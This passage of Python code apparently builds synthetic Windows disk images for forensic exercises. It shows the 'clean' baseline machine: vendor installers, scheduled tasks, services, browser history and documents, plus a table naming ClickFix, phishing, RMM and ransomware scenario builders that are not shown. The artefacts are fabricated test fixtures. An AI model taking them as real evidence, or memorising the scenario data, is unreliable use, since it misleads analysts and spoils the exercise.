                             ("ChromeSetup.exe", "https://dl.google.com/tag/s/appguid/update2/installers/ChromeSetup.exe",
                              plus(t0, hours=2))]:
        p = f"{prof}\\Downloads\\{name}"
        m.add_file(p, b"MZ" + b"\x00" * 62 + os.urandom(2000), ctime=when)
        m.add_ads(p, "Zone.Identifier", f"[ZoneTransfer]\r\nZoneId=3\r\nHostUrl={host}\r\n")
        _prefetch(m, name, p, [plus(when, minutes=1)])
    # scheduled tasks every such machine has
    tasks = [("OneDrive Standalone Update Task-" + sid, f"{local}\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
              "/reporting", "Microsoft Corporation"),
             ("GoogleUpdateTaskMachineUA{2B3C4D5E-6F70-4182-93A4-B5C6D7E8F901}",
              r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe", "/ua /installsource scheduler", "Google LLC"),
             ("MicrosoftEdgeUpdateTaskMachineCore{A1B2C3D4-E5F6-4789-9ABC-DEF012345678}",
              r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe", "/c", "Microsoft Corporation")]
    for name, cmd, args, author in tasks:
        m.add_file(f"C:\\Windows\\System32\\Tasks\\{name}", _task_xml(cmd, args, author, "2026-02-03T10:00:00", "\\" + name),
                   ctime=plus(t0, days=1))
    # services installed by ordinary software
    for name, image, when in [("edgeupdate", "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /svc",
                               plus(t0, hours=1)),
                              ("GoogleChromeElevationService",
                               "\"C:\\Program Files\\Google\\Chrome\\Application\\129.0.6668.59\\elevation_service.exe\"",
                               plus(t0, hours=2)),
                              ("ZoomCptService", "\"C:\\Program Files\\Common Files\\Zoom\\Support\\CptService.exe\" -user_path "
                               f"\"{prof}\\AppData\\Roaming\\Zoom\"", plus(t0, days=3, minutes=2))]:
        s = rf"ControlSet001\Services\{name}"
        m.system.expand_sz(s, "ImagePath", image, ts=when)
        m.system.dword(s, "Start", 2 if "edge" in name else 3)
        m.system.dword(s, "Type", 0x10)
        m.system.sz(s, "ObjectName", "LocalSystem")
        _service_event(m, when, name, image, "auto start" if "edge" in name else "demand start")
    # browsing: genuine sign-in pages and ordinary sites
    chrome = f"{prof}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    A.chrome_history(m.path(f"{chrome}\\History"), [
        dict(url="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=1", title="Sign in to your account",
             time=plus(day, minutes=1)),
        dict(url="https://outlook.office.com/mail/", title="Mail - Kim Clark - Outlook", time=plus(day, minutes=2)),
        dict(url="https://accounts.google.com/v3/signin/identifier", title="Sign in - Google Accounts", time=plus(day, minutes=5)),
        dict(url="https://github.com/login", title="Sign in to GitHub · GitHub", time=plus(day, minutes=7)),
        dict(url="https://www.bbc.com/news", title="Home - BBC News", time=plus(day, minutes=12)),
        dict(url="https://learn.microsoft.com/en-us/powershell/", title="PowerShell documentation - Microsoft Learn",
             time=plus(day, minutes=30)),
        dict(url="https://www.google.com/search?q=how+to+verify+my+account+in+teams", title="how to verify my account in teams - Google Search",
             time=plus(day, minutes=33)),
    ], downloads=[dict(url="https://zoom.us/client/latest/ZoomInstallerFull.exe",
                       target_path=f"{prof}\\Downloads\\ZoomInstallerFull.exe", start=plus(t0, days=3, seconds=-20),
                       end=plus(t0, days=3), size=2064)])
    m._register(f"{chrome}\\History", t0, plus(day, minutes=33), None)
    # documents
    os.makedirs(m.path(f"{prof}\\Documents"), exist_ok=True)
    A.make_docx(m.path(f"{prof}\\Documents\\Quarterly review.docx"), "Quarterly review", ["Draft."], author="kclark")
    m._register(f"{prof}\\Documents\\Quarterly review.docx", plus(day, days=-3), plus(day, minutes=50), None)
    for i in range(30):
        m.add_file(f"{prof}\\Documents\\Notes\\note_{i:02d}.txt", f"note {i}\r\n", ctime=plus(day, days=-i))
    m.finalize()
    return m


BUILDERS = {"CLICKFIX-01": build_clickfix, "PHISH-01": build_phish, "RMM-01": build_rmm, "RANSOM-01": build_ransom,
            "CLEAN-01": build_clean}
